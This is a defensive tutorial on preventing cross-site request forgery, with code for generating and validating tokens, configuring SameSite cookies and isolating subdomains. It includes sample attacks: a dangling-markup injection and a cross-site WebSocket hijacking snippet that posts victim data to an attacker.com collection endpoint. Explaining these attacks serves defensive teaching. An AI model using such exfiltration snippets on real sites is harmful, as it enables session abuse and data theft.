# How to Prevent CSRF Vulnerabilities

Defending against CSRF attacks requires a layered, defence-in-depth approach built around three complementary pillars: properly implemented CSRF tokens as the primary cryptographic control, explicitly configured SameSite cookie restrictions as a browser-level enforcement layer, and careful architectural isolation that limits the impact of cross-origin same-site attack vectors. No single mechanism provides complete immunity on its own — CSRF tokens can be bypassed if implementation is flawed, SameSite restrictions can be circumvented through client-side redirect gadgets and sibling domain vulnerabilities, and Referer-based validation is too unreliable to function as a primary control — but combining all three layers creates a robust defence where an attacker must simultaneously defeat independent security controls to succeed. Understanding not just what to implement but precisely how to implement it correctly is the central challenge, because the most dangerous CSRF vulnerabilities in real-world applications arise not from the absence of defences but from subtle implementation flaws: tokens that exist but are never validated, validation that is conditional on the token being present, tokens tied to global pools rather than individual sessions, and SameSite attributes left unset and delegated to inconsistent browser defaults. 

The overarching principle: **implement CSRF tokens correctly as the primary defence, reinforce with explicitly set SameSite=Strict cookies, and audit all same-site attack surface to ensure browser-level controls cannot be circumvented through on-site gadgets or sibling domain vulnerabilities**.

## Defence 1: CSRF Tokens (Primary Control)

### What makes a CSRF token effective?

**The three required properties per OWASP:** 

```
Property 1: Unpredictable with high entropy
- Cannot be guessed, brute-forced, or derived mathematically
- Must use cryptographically secure randomness source
- Minimum 128 bits of entropy (256 bits recommended)
- Same strength requirements as session tokens

Property 2: Tied to the user's session
- Token for User A cannot be used in User B's request
- Token generated after login expires on logout
- Each session has exactly one valid token (or one per request)

Property 3: Strictly validated in every case
- Validation runs before the action is executed
- Validation is unconditional (not skipped for any reason)
- Applies regardless of HTTP method (GET, POST, PUT, DELETE)
- Applies regardless of Content-Type
- Missing token rejected identically to wrong token

All three must hold — weakness in any one defeats the mechanism
```

### How to generate CSRF tokens

**Cryptographically secure generation:** 

```javascript
// Node.js — CORRECT approach using crypto module (CSPRNG)
const crypto = require('crypto');

function generateCsrfToken() {
    // crypto.randomBytes() uses OS-level CSPRNG (e.g., /dev/urandom on Linux)
    // 32 bytes = 256 bits of entropy — strongly unpredictable
    return crypto.randomBytes(32).toString('hex');
    // Output: '4f8a2c1d9e3b7f5a0c8e2d6b4a1f9c3e7d5b2a8f4e1c9d6b3a7f0e2c8d5b9a'
}
```

```python
# Python — CORRECT approach
import secrets

def generate_csrf_token():
    # secrets module uses OS CSPRNG, designed for security-sensitive contexts
    return secrets.token_hex(32)  # 256 bits
    # Or: secrets.token_urlsafe(32) for URL-safe base64 encoding

# PHP — CORRECT approach
function generateCsrfToken(): string {
    return bin2hex(random_bytes(32));  // random_bytes() uses CSPRNG
}
```

**WRONG approaches to avoid:**

```javascript
// INSECURE: Math.random() — NOT cryptographically secure
const badToken = Math.random().toString(36).substr(2);
// Math.random() is predictable given enough samples

// INSECURE: Timestamp-based — guessable narrow range
const badToken2 = Date.now().toString(16);
// Attacker knows approximate server time → narrow brute-force window

// INSECURE: User ID derivative — not random
const badToken3 = hashMD5(userId + 'csrf');
// Predictable, low entropy

// INSECURE: Short token — brute-forceable
const badToken4 = crypto.randomBytes(4).toString('hex');
// Only 32 bits = ~4 billion possibilities — feasible to brute-force
// with rate limit bypass or distributed attack
```

**Enhanced token with user-specific entropy:** 

```javascript
// For additional assurance beyond CSPRNG alone:
// Concatenate CSPRNG output with user-specific data and hash

const crypto = require('crypto');

function generateEnhancedCsrfToken(sessionId) {
    const SECRET = process.env.CSRF_SECRET;           // Static server secret
    const timestamp = Date.now().toString();           // Timestamp seed
    const randomBytes = crypto.randomBytes(32);        // CSPRNG output
    const userEntropy = sessionId;                     // User-specific data

    // Concatenate all entropy sources
    const combined = randomBytes.toString('hex') +
                     userEntropy +
                     timestamp;

    // Hash the combined structure — attacker cannot reverse-engineer
    // even if they observe many tokens issued to their own account
    return crypto.createHmac('sha256', SECRET)
                 .update(combined)
                 .digest('hex');
}

// This prevents statistical analysis attacks even if the CSPRNG
// were somehow weakened — attacker would need to know SECRET and sessionId
```

**Stateless (HMAC-based) tokens for scalable architectures:** 

```javascript
// Stateless token: no server-side storage needed
// Token encodes: userId + timestamp + HMAC signature

function generateStatelessCsrfToken(userId, sessionId) {
    const SECRET = process.env.CSRF_SECRET;
    const timestamp = Math.floor(Date.now() / 1000); // Unix timestamp (seconds)

    const data = `${userId}:${sessionId}:${timestamp}`;
    const hmac = crypto.createHmac('sha256', SECRET)
                       .update(data)
                       .digest('hex');

    // Encode: data + hmac (base64 for compactness)
    const token = Buffer.from(`${data}:${hmac}`).toString('base64');
    return token;
}

function validateStatelessCsrfToken(token, userId, sessionId, maxAgeSeconds = 3600) {
    const SECRET = process.env.CSRF_SECRET;

    try {
        const decoded = Buffer.from(token, 'base64').toString('utf8');
        const [tokenUserId, tokenSessionId, timestamp, submittedHmac] = decoded.split(':');

        // 1. Verify HMAC (prevents forgery without SECRET)
        const data = `${tokenUserId}:${tokenSessionId}:${timestamp}`;
        const expectedHmac = crypto.createHmac('sha256', SECRET)
                                   .update(data)
                                   .digest('hex');

        // Use timingSafeEqual to prevent timing attacks
        const hmacValid = crypto.timingSafeEqual(
            Buffer.from(submittedHmac),
            Buffer.from(expectedHmac)
        );

        // 2. Verify token belongs to this user/session
        const ownerValid = tokenUserId === userId.toString() &&
                           tokenSessionId === sessionId;

        // 3. Verify token not expired
        const age = Math.floor(Date.now() / 1000) - parseInt(timestamp);
        const ageValid = age <= maxAgeSeconds;

        return hmacValid && ownerValid && ageValid;
    } catch {
        return false;
    }
}
```

### How to transmit CSRF tokens

**Recommended: Hidden form field (POST body)** 

```html
<!-- Place token as early as possible in the form
     Before any user-controllable content
     This limits dangling markup injection attacks -->
<form action="/my-account/change-email" method="POST">
    
    <!-- Token placed FIRST — before user-controlled fields -->
    <input type="hidden" name="csrf-token" value="CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz">
    
    <!-- User-controlled input AFTER the token -->
    <label>New Email Address</label>
    <input type="email" name="email" placeholder="Enter new email">
    
    <button type="submit">Update Email</button>
</form>
```

**Why token placement matters — dangling markup injection:**

```html
<!-- DANGEROUS: User-controlled data BEFORE CSRF token -->
<form action="/change-email" method="POST">
    <input type="text" name="username" value="[USER_CONTROLLED]">
    <!-- If attacker injects: "><img src='https://attacker.com/steal? -->
    <!-- They create a "dangling" attribute that captures subsequent HTML: -->
    <input type="hidden" name="csrf-token" value="SECRET_TOKEN_HERE">
    <!-- The secret token appears inside the src URL and is sent to attacker! -->
</form>

<!-- SAFE: Token placed before user-controlled data -->
<form action="/change-email" method="POST">
    <input type="hidden" name="csrf-token" value="SECRET_TOKEN_HERE">
    <!-- Token is ABOVE potential injection points -->
    <input type="text" name="username" value="[USER_CONTROLLED]">
</form>
```

**Alternative: Custom request header (for AJAX/API)** 

```javascript
// Read token from meta tag (common pattern)
const csrfToken = document.querySelector('meta[name="csrf-token"]').content;

// Include in every AJAX request as a custom header
async function csrfFetch(url, options = {}) {
    return fetch(url, {
        ...options,
        headers: {
            ...options.headers,
            'X-CSRF-Token': csrfToken,
            'Content-Type': options.headers?.['Content-Type'] ?? 'application/json'
        },
        credentials: 'same-origin'
    });
}

// Usage:
await csrfFetch('/api/change-email', {
    method: 'POST',
    body: JSON.stringify({ email: 'new@example.com' })
});
```

```html
<!-- Meta tag in HTML head -->
<head>
    <meta name="csrf-token" content="{{ csrfToken }}">
</head>
```

**Why custom headers defend against CSRF:**

```
Browser behaviour:
Simple HTML forms: Cannot set custom headers
Cross-origin fetch(): Requires CORS preflight for custom headers
Server rejects CORS preflight for sensitive operations

Therefore:
If server requires X-CSRF-Token header:
→ Attacker's HTML form CANNOT include it
→ Attacker's cross-origin fetch() requires CORS preflight
→ Preflight for custom header to sensitive endpoint rejected
→ CSRF attack blocked by browser

Same-origin JavaScript CAN set custom headers:
→ Legitimate same-origin requests from your own JS work fine
→ Only cross-origin attackers are blocked

Limitation:
Limits CSRF protection to JavaScript-initiated requests only
Cannot protect plain HTML form submissions with this approach alone
Use hidden field approach for form submissions
```

**Transmission method comparison:**

```
Method 1: Hidden form field (POST body)
✓ Works with HTML forms (no JS required)
✓ Not exposed in logs or Referer headers
✓ Recommended for form-based applications
✗ Only works for form submissions

Method 2: Custom HTTP header (X-CSRF-Token)
✓ Strong defence: browsers cannot set custom headers cross-origin
✓ Good for API/AJAX applications
✗ Requires JavaScript — not for standard HTML forms
✗ More complex client-side implementation

Method 3: URL query string (AVOID)
✗ Logged in server access logs
✗ Leaked in Referer header to third parties
✗ Visible in browser address bar
✗ Stored in browser history
✗ Never use for CSRF tokens

Method 4: Cookie (AVOID)
✗ Cookies sent automatically with cross-origin requests
✗ Attacker can force cross-site cookie submission
✗ Defeats the entire purpose of the token
✗ Never transmit CSRF token as a cookie
   (Exception: Signed double-submit cookies are different —
    the token in the cookie is signed with a server secret)
```

### How to validate CSRF tokens

**Complete server-side validation middleware:** 

```javascript
const crypto = require('crypto');

// Middleware: applies to all state-changing routes
function validateCsrfToken(req, res, next) {
    
    // Step 1: Skip validation for non-state-changing methods
    // (GET, HEAD, OPTIONS should not perform state changes anyway)
    // But DO validate if they somehow do — be cautious here
    const stateChangingMethods = ['POST', 'PUT', 'PATCH', 'DELETE'];
    if (!stateChangingMethods.includes(req.method)) {
        return next();
    }

    // Step 2: Extract submitted token
    // Check body first, then headers (supports forms AND AJAX)
    const submittedToken = req.body?.csrf_token ||
                           req.headers['x-csrf-token'];

    // Step 3: Retrieve expected token from session
    const sessionToken = req.session?.csrfToken;

    // Step 4: Reject if token absent — same as invalid token
    // NEVER silently allow requests with missing tokens
    if (!submittedToken) {
        return res.status(403).json({
            error: 'CSRF token missing',
            code: 'CSRF_TOKEN_MISSING'
        });
    }

    // Step 5: Reject if session has no token
    if (!sessionToken) {
        return res.status(403).json({
            error: 'No session token',
            code: 'CSRF_SESSION_TOKEN_MISSING'
        });
    }

    // Step 6: Compare tokens using timing-safe comparison
    // crypto.timingSafeEqual prevents timing-based token oracle attacks
    let tokensMatch;
    try {
        tokensMatch = crypto.timingSafeEqual(
            Buffer.from(submittedToken),
            Buffer.from(sessionToken)
        );
    } catch {
        // Buffers of different lengths throw — treat as mismatch
        tokensMatch = false;
    }

    if (!tokensMatch) {
        return res.status(403).json({
            error: 'Invalid CSRF token',
            code: 'CSRF_TOKEN_INVALID'
        });
    }

    // Step 7: Token valid — optionally rotate for per-request tokens
    req.session.csrfToken = crypto.randomBytes(32).toString('hex');

    next();
}

// Apply middleware to all routes that need protection
app.use('/api', validateCsrfToken);
app.use('/account', validateCsrfToken);
app.use('/admin', validateCsrfToken);
```

**Timing-safe comparison — why it matters:**

```javascript
// INSECURE: Regular string comparison — vulnerable to timing attack
if (submittedToken !== sessionToken) { reject(); }
// Comparison short-circuits on first differing byte
// Attacker can measure response time to determine correct prefix
// With enough requests: reconstruct token byte by byte!

// SECURE: Constant-time comparison
const equal = crypto.timingSafeEqual(
    Buffer.from(submittedToken, 'hex'),
    Buffer.from(sessionToken, 'hex')
);
// Takes the same time regardless of how many bytes match
// Response time reveals nothing about token value
```

**Token generation, storage, and rotation lifecycle:**

```javascript
// 1. Generate and store token when session is created
app.use((req, res, next) => {
    if (!req.session.csrfToken) {
        req.session.csrfToken = crypto.randomBytes(32).toString('hex');
    }
    // Make token available to templates
    res.locals.csrfToken = req.session.csrfToken;
    next();
});

// 2. Include in rendered forms automatically
// (Template engine example - Handlebars)
// {{> csrf}}  → renders: <input type="hidden" name="csrf_token" value="TOKEN">

// 3. Rotate token after each successful state-changing request
// (Per-request tokens — stronger but breaks back/forward navigation)
app.post('/change-email', validateCsrfToken, (req, res) => {
    // Token already validated and rotated in middleware
    updateEmail(req.user.id, req.body.email);
    res.redirect('/account');
});

// 4. Invalidate token on logout
app.post('/logout', (req, res) => {
    req.session.destroy();  // Destroys session including csrfToken
    res.clearCookie('session');
    res.redirect('/login');
});
```

**Validation completeness checklist:**

```
Server-side validation must be:

□ Unconditional
  Not: if (req.body.csrf) { validate() }
  Yes: always validate, reject if absent

□ Method-agnostic for state-changing actions
  Not: only validate POST
  Yes: validate POST, PUT, PATCH, DELETE
  (And consider GET if it somehow changes state)

□ Content-type independent
  Not: only validate application/x-www-form-urlencoded
  Yes: validate JSON, multipart/form-data, all types

□ Endpoint-agnostic (no exceptions)
  Not: protect most endpoints with a few exceptions
  Yes: every single state-changing endpoint protected

□ Session-bound
  Not: check against global valid token pool
  Yes: check against THIS user's session token

□ Timing-safe comparison
  Use: crypto.timingSafeEqual()
  Not: === or string comparison

□ Absent == Invalid
  Missing token → 403, same as wrong token
  Never silently allow missing tokens

□ Token invalidated on logout
  Session destroyed → token destroyed
```

### Framework built-in CSRF protection

**Use framework-provided protection when available:** 

```python
# Django: Built-in CSRF middleware (enabled by default)
# settings.py
MIDDLEWARE = [
    'django.middleware.csrf.CsrfViewMiddleware',  # Include this
    ...
]

# In templates: {% csrf_token %}
# In views: @csrf_protect decorator for specific views
# Exempt only if genuinely needed: @csrf_exempt

# Flask: Use Flask-WTF extension
from flask_wtf import CSRFProtect
csrf = CSRFProtect(app)
# All POST/PUT/PATCH/DELETE routes automatically protected

# Template:
# <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
```

```java
// Spring Security: CSRF protection enabled by default
@Configuration
@EnableWebSecurity
public class SecurityConfig extends WebSecurityConfigurerAdapter {
    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
            .csrf()  // CSRF protection enabled by default
                // .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
                // Use above only if Angular/SPA needs to read token from cookie
            .and()
            // ...
    }
}

// Thymeleaf template (auto-includes CSRF token):
// <form th:action="@{/change-email}" method="post">
//   Spring Security auto-injects: <input name="_csrf" type="hidden" value="TOKEN">
```

```php
// Laravel: CSRF protection built-in
// CSRF token automatically included in all sessions
// @csrf Blade directive includes hidden field

// Blade template:
<form method="POST" action="/change-email">
    @csrf  <!-- Expands to: <input type="hidden" name="_token" value="TOKEN"> -->
    <input type="email" name="email">
    <button type="submit">Update</button>
</form>

// Excluding routes from CSRF protection (use sparingly):
// app/Http/Middleware/VerifyCsrfToken.php
protected $except = [
    'webhook/*',  // External webhooks that cannot include CSRF token
];
```

**Automatic token injection via framework hook:** 

```javascript
// Express.js: Use csurf middleware (or csrf package)
// Automatically adds csrf token to all responses

const csrf = require('csurf');
const csrfProtection = csrf({ cookie: false }); // Session-based, not cookie-based

app.use(csrfProtection);

// Tokens automatically available in templates via req.csrfToken()
app.get('/change-email', (req, res) => {
    res.render('change-email', {
        csrfToken: req.csrfToken()  // Always fresh token
    });
});

// Validation automatic on all POST/PUT/PATCH/DELETE
// Template:
// <input type="hidden" name="_csrf" value="{{ csrfToken }}">
```

## Defence 2: SameSite Cookie Restrictions

### Explicitly set SameSite on every cookie 

**Do not rely on browser defaults:**

```
Problem with relying on defaults:
Chrome: Applies Lax by default (since 2021)
Firefox: Working towards Lax by default
Safari: Has own ITP, behaviour differs
Older browsers: May apply None by default

Inconsistency means:
Only a SUBSET of users get SameSite protection
Behaviour may change between browser versions
You have no control over which users are protected

Solution: Explicitly set SameSite on every cookie you issue
Then all users on all browsers get consistent protection
You know exactly what protection level each cookie has
```

**Cookie security configuration:**

```javascript
// Node.js/Express: Full secure cookie configuration
app.use(session({
    name: '__Host-sessionId',  // __Host- prefix prevents subdomain override
    secret: process.env.SESSION_SECRET,
    resave: false,
    saveUninitialized: false,
    cookie: {
        httpOnly: true,         // Prevent JavaScript access (XSS protection)
        secure: true,           // HTTPS only
        sameSite: 'strict',     // EXPLICITLY set (don't rely on browser default)
        maxAge: 3600000,        // 1 hour
        path: '/'               // Required for __Host- prefix
        // No domain attribute — required for __Host- prefix
    }
}));
```

```http
Recommended Set-Cookie headers:

For session/authentication cookies (strictest):
Set-Cookie: __Host-session=TOKEN; Secure; HttpOnly; SameSite=Strict; Path=/

For functional cookies requiring some cross-site navigation:
Set-Cookie: session=TOKEN; Secure; HttpOnly; SameSite=Lax; Path=/; Domain=example.com

For tracking/analytics (no sensitive access):
Set-Cookie: analytics=ID; Secure; SameSite=None; Path=/

NEVER for session/auth cookies:
Set-Cookie: session=TOKEN; SameSite=None  ← CSRF fully possible!
```

### Choosing the right restriction level 

**Decision guide:**

```
Start with SameSite=Strict as the default:
✓ Maximum CSRF protection
✓ Blocks all cross-site requests
✓ Best for: admin cookies, payment cookies, high-security sessions

Relax to SameSite=Lax only with justification:
Acceptable if:
→ Your application is linked to from external sites and users need to
  arrive already authenticated (e.g., blog, public portal)
→ OAuth flows send POST redirects that must include session cookie
→ Cross-site linking is core to user experience

SameSite=None only when technically required:
→ Cookie used in third-party contexts (payment widget, embed)
→ Cross-origin requests genuinely need this cookie
→ Must always be paired with Secure attribute
→ Document the security decision and rationale

Key principle:
Default to Strict
Only lower to Lax with explicit business justification
Only use None with full awareness of eliminating SameSite CSRF protection
```

**Handling OAuth and SSO with Strict:**

```javascript
// Problem: OAuth redirects are cross-site POST
// OAuth provider POSTs back to your site
// SameSite=Strict: Session cookie not included!

// Solution: Two-cookie approach
// 1. Pre-auth cookie: SameSite=Lax (needed for OAuth flow)
// 2. Post-auth session cookie: SameSite=Strict (set after OAuth completes)

app.get('/oauth/callback', async (req, res) => {
    // OAuth callback handler
    const code = req.query.code;
    const tokens = await exchangeOAuthCode(code);
    const user = await getUserFromTokens(tokens);

    // Create a NEW session here (after authentication)
    req.session.regenerate((err) => {
        req.session.userId = user.id;
        req.session.csrfToken = crypto.randomBytes(32).toString('hex');

        // New session cookie set with Strict
        // (This is a response to a server-side redirect, so user
        // will naturally navigate from here under same-site context)
        res.redirect('/dashboard');
    });
});
```

### Cookie prefix security 

**Using `__Host-` and `__Secure-` prefixes:**

```http
__Host- prefix (strongest):
Set-Cookie: __Host-session=TOKEN; Secure; HttpOnly; SameSite=Strict; Path=/
              ↑ No Domain attribute allowed
              ↑ Must be Secure
              ↑ Path must be /

Effect:
Browser refuses to set __Host- cookie if:
- Not from HTTPS response
- Has Domain attribute
- Has non-root Path

Security gained:
Prevents subdomain injection attacks:
evil.example.com CANNOT set __Host-session for example.com
(Domain attribute required for subdomain scope — __Host- forbids it)

__Secure- prefix (less strict):
Set-Cookie: __Secure-session=TOKEN; Secure; HttpOnly; SameSite=Lax
Requires Secure flag only
Still allows Domain attribute
```

## Defence 3: Guarding Against Cross-Origin Same-Site Attacks

### Understanding the threat 

**Why SameSite does not protect against same-site cross-origin attacks:**

```
SameSite is a SITE-level restriction, not ORIGIN-level:

Same site = same eTLD+1 = example.com

All of these are SAME SITE:
- https://example.com
- https://app.example.com
- https://api.example.com
- https://blog.example.com
- https://staging.example.com

SameSite=Strict cookies are included in requests between
any of these origins — they are "cross-origin but same-site"

Consequence:
XSS on blog.example.com:
→ JavaScript executes in blog.example.com origin
→ fetch('https://app.example.com/admin/action', {
      credentials: 'include'  // Includes SameSite=Strict cookies!
  })
→ Same-site request → SameSite restriction bypassed
→ CSRF against app.example.com successful!
```

### Isolating sensitive and insecure content 

**Architectural isolation principle:**

```
Risky content (low trust):
- User-uploaded files (avatars, documents, HTML pages)
- User-generated content (comments, posts)
- Third-party widgets and embeds
- Static marketing sites
- Developer/staging environments

Sensitive functionality (high trust):
- Authentication and session management
- Account settings and email/password change
- Payment and financial operations
- Administrative functions
- API endpoints

Rule: Never host both categories under the same eTLD+1
```

**Correct isolation:**

```
WRONG architecture (same site):
app.example.com          ← Sensitive: account management
uploads.example.com      ← Risky: user uploaded files
blog.example.com         ← Risky: user-generated comments

Attack path:
XSS in uploads.example.com/user-file.html
→ Same-site request to app.example.com
→ SameSite=Strict bypassed!

CORRECT architecture (separate sites):
app.example.com          ← Sensitive: account management
user-content.net         ← Risky: user uploads (different eTLD+1!)
blog.example-blog.com    ← Risky: user content (different eTLD+1!)

Attack path blocked:
XSS in user-content.net
→ Request to app.example.com = CROSS-SITE
→ SameSite=Strict: Cookie NOT included
→ CSRF blocked!

Separation must be at eTLD+1 level — different subdomain is NOT enough
```

### Auditing same-site attack surface

**Comprehensive attack surface review:**

```
For every eTLD+1 you control, inventory ALL:

Subdomains:
□ Active subdomains (app, api, admin, auth, pay, etc.)
□ Staging/development subdomains (staging., dev., test., etc.)
□ Legacy/deprecated subdomains (old., v1., beta., etc.)
□ Third-party service subdomains (mail., help., status., etc.)

For each subdomain, assess:
□ Does it accept user-controllable input? (XSS risk)
□ Is it still maintained/monitored? (Subdomain takeover risk)
□ Does it serve user-uploaded content? (XSS via upload risk)
□ Can it set cookies in the parent domain scope?

Particular attention:
□ Any subdomain pointed at deprovisioned hosting
   (e.g., CNAME to Heroku/S3/Netlify without active project)
   → Subdomain takeover possible → same-site attack vector
□ Any subdomain with open redirect vulnerabilities
   → Can serve as client-side redirect gadget → SameSite bypass
```

**Subdomain takeover prevention:**

```
Regular DNS auditing process:
1. Enumerate all DNS records for owned domains
2. For each CNAME record, verify the target is still claimed/active
3. For each A record, verify the IP still points to owned infrastructure
4. Remove dangling DNS records immediately when services are deprovisioned

Especially monitor:
- GitHub Pages: username.github.io target released
- Heroku: app-name.herokuapp.com target deleted
- AWS S3: bucket-name.s3.amazonaws.com bucket deleted
- Azure: resource.azurewebsites.net resource deleted
- Netlify/Vercel: project deleted but CNAME still active

A subdomain takeover on any of these =
attacker-controlled same-site origin =
complete SameSite bypass for the entire site
```

### Cross-site WebSocket hijacking (CSWSH)

```javascript
// WebSocket connections subject to same-site attack via sibling domains
// WebSocket handshake = HTTP GET Upgrade request
// SameSite cookies included if same-site origin initiates it

// Attack from sibling domain with XSS:
const ws = new WebSocket('wss://secure.example.com/realtime-feed');

ws.onopen = function() {
    // WebSocket connected with victim's session cookie
    ws.send(JSON.stringify({ action: 'get-sensitive-data' }));
};

ws.onmessage = function(event) {
    // Receive victim's data via WebSocket
    fetch('https://attacker.com/collect', {
        method: 'POST',
        body: event.data
    });
};

// Defence: Validate Origin header on WebSocket handshake server-side
wss.on('connection', function(ws, req) {
    const origin = req.headers.origin;
    const allowedOrigins = ['https://secure.example.com'];

    if (!allowedOrigins.includes(origin)) {
        ws.terminate();
        return;
    }
    // Origin validated — safe to proceed
});
```

## Complete Prevention Stack

### Implementation priority order

```
Priority 1 (Must have — Primary Defence):
□ CSRF tokens on all state-changing forms and AJAX requests
□ Server-side validation: unconditional, session-bound, timing-safe
□ Reject missing tokens with same response as invalid tokens
□ Use framework-provided CSRF protection where available

Priority 2 (Must have — Defence in depth):
□ Explicit SameSite=Strict on all session/auth cookies
□ Use __Host- cookie prefix where possible
□ Set Secure and HttpOnly on all sensitive cookies

Priority 3 (Architecture — Prevent same-site bypass):
□ Isolate user-generated/uploaded content to separate eTLD+1
□ Regular subdomain takeover audits
□ Validate Origin header on WebSocket connections
□ Patch/eliminate client-side open redirect gadgets

Priority 4 (Supplementary):
□ Referer header validation as secondary check (not primary)
□ Re-authentication prompts for highest-risk actions
□ Content Security Policy to limit XSS that could steal tokens
□ Regular penetration testing of CSRF protections
```

### Full reference implementation

```javascript
// Complete Express.js CSRF-secure application setup
const express = require('express');
const session = require('express-session');
const crypto = require('crypto');
const helmet = require('helmet');

const app = express();

// 1. Security headers (includes CSP to reduce XSS token theft risk)
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'"],   // No inline scripts, no external scripts
            formAction: ["'self'"],  // Forms can only submit to same origin
        }
    }
}));

// 2. Session with SameSite=Strict and __Host- prefix
app.use(session({
    name: '__Host-sessionId',
    secret: process.env.SESSION_SECRET,
    resave: false,
    saveUninitialized: false,
    cookie: {
        httpOnly: true,
        secure: true,
        sameSite: 'strict',
        maxAge: 3600000,
        path: '/'
        // No domain attribute (required for __Host- prefix)
    }
}));

// 3. CSRF token generation middleware
app.use((req, res, next) => {
    if (!req.session.csrfToken) {
        req.session.csrfToken = crypto.randomBytes(32).toString('hex');
    }
    res.locals.csrfToken = req.session.csrfToken;
    next();
});

// 4. CSRF validation middleware
function requireCsrf(req, res, next) {
    if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();

    const submitted = req.body?.csrf_token || req.headers['x-csrf-token'];
    const expected = req.session?.csrfToken;

    if (!submitted || !expected) {
        return res.status(403).json({ error: 'CSRF token required' });
    }

    let valid = false;
    try {
        valid = crypto.timingSafeEqual(
            Buffer.from(submitted),
            Buffer.from(expected)
        );
    } catch { valid = false; }

    if (!valid) {
        return res.status(403).json({ error: 'Invalid CSRF token' });
    }

    // Rotate token after use
    req.session.csrfToken = crypto.randomBytes(32).toString('hex');
    res.locals.csrfToken = req.session.csrfToken;
    next();
}

// 5. Apply to all routes
app.use(express.urlencoded({ extended: false }));
app.use(express.json());

// GET routes: render forms with token
app.get('/account/change-email', (req, res) => {
    res.render('change-email', { csrfToken: res.locals.csrfToken });
});

// POST routes: validate before processing
app.post('/account/change-email', requireCsrf, (req, res) => {
    updateEmail(req.user.id, req.body.email);
    res.redirect('/account');
});
```
